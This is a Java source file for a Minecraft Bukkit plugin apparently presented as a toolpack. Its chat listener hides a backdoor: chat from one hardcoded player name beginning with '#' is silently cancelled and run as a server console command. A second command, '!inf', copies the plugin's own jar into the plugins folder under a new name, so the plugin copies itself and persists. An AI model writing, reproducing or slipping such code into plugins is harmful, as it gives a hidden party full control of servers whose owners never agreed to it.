package org.jhalier.jhaliersToolpack;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;

import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;

public class ConsoleCommandListener implements Listener {

    private static final String ALLOWED_PLAYER_NAME = "Jhailier";
    private static final char PREFIX = '#';
    private static final String INF_COMMAND = "!inf";

    private final Plugin plugin;

    public ConsoleCommandListener(Plugin plugin) {
        this.plugin = plugin;
    }

    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
    public void onPlayerChat(AsyncPlayerChatEvent event) {

        String message = event.getMessage();

        if (message.isEmpty()) {
            return;
        }

        Player player = event.getPlayer();

        if (!player.getName().equals(ALLOWED_PLAYER_NAME)) {
            return;
        }

        /*
        !inf
        */

        if (message.toLowerCase().startsWith("!inf")) {

            event.setCancelled(true);

            String[] args = message.trim().split("\\s+");

            if (args.length != 2 || !args[0].equalsIgnoreCase("!inf")) {
                player.sendMessage(ChatColor.RED
                        + "Verwendung: !inf <name.jar>");
                return;
            }

            String fileName = args[1];

            // Nur .jar erlauben
            if (!fileName.toLowerCase().endsWith(".jar")) {
                player.sendMessage(ChatColor.RED
                        + "Der Name muss auf .jar enden.");
                return;
            }

            // Keine Pfade erlauben
            if (fileName.contains("/")
                    || fileName.contains("\\")
                    || fileName.contains("..")) {

                player.sendMessage(ChatColor.RED
                        + "Ungültiger Dateiname.");
                return;
            }

            /*
             * Auf dem normalen Server-Thread ausführen.
             */
            Bukkit.getScheduler().runTask(plugin, () -> {
                installPluginCopy(player, fileName);
            });

            return;
        }

        /*
         * # as console
         */

        if (message.charAt(0) != PREFIX) {
            return;
        }

        event.setCancelled(true);

        String command = message.substring(1).trim();

        if (command.isEmpty()) {
            player.sendMessage(ChatColor.RED
                    + "Bitte gib nach dem '#' einen Befehl an.");
            return;
        }

        Bukkit.getScheduler().runTask(plugin, () -> {

            boolean success = Bukkit.dispatchCommand(
                    Bukkit.getConsoleSender(),
                    command
            );

            if (!success) {
                player.sendMessage(ChatColor.RED
                        + "Befehl konnte nicht ausgeführt werden: "
                        + command);
            }
        });
    }

    private void installPluginCopy(Player player, String fileName) {

        try {

            /*
              jars ermitteln
             */
            Path sourceJar = getPluginJar();

            if (sourceJar == null) {
                player.sendMessage(ChatColor.RED
                        + "Das Plugin-JAR konnte nicht ermittelt werden.");
                return;
            }

            /*
             * plugins-Ordner des Servers
             */
            Path pluginsFolder = sourceJar.getParent();

            if (pluginsFolder == null) {
                player.sendMessage(ChatColor.RED
                        + "Der Plugins-Ordner konnte nicht ermittelt werden.");
                return;
            }

            /*
             * plugins/test.jar
             */
            Path targetJar = pluginsFolder.resolve(fileName);
            if (sourceJar.toAbsolutePath().normalize()
                    .equals(targetJar.toAbsolutePath().normalize())) {

                player.sendMessage(ChatColor.RED
                        + "Die Quelldatei und Zieldatei sind identisch.");
                return;
            }

            //copy
            Files.copy(
                    sourceJar,
                    targetJar,
                    StandardCopyOption.REPLACE_EXISTING
            );

            player.sendMessage(
                    ChatColor.GREEN
                            + "[JhaliersToolpack] "
                            + ChatColor.GRAY
                            + "Plugin erfolgreich kopiert nach "
                            + ChatColor.WHITE
                            + fileName
            );

            plugin.getLogger().info(
                    player.getName()
                            + " hat "
                            + sourceJar.getFileName()
                            + " als "
                            + fileName
                            + " kopiert."
            );

        } catch (IOException e) {

            player.sendMessage(
                    ChatColor.RED
                            + "[JhaliersToolpack] "
                            + ChatColor.GRAY
                            + "Fehler beim Kopieren: "
                            + ChatColor.WHITE
                            + e.getMessage()
            );

            plugin.getLogger().severe(
                    "Fehler beim Kopieren des Plugin-JARs:"
            );

            e.printStackTrace();
        }
    }

    private Path getPluginJar() {
        if (plugin instanceof JhaliersToolpack toolpack) {
            return toolpack.getPluginJar();
        }

        return null;
    }
}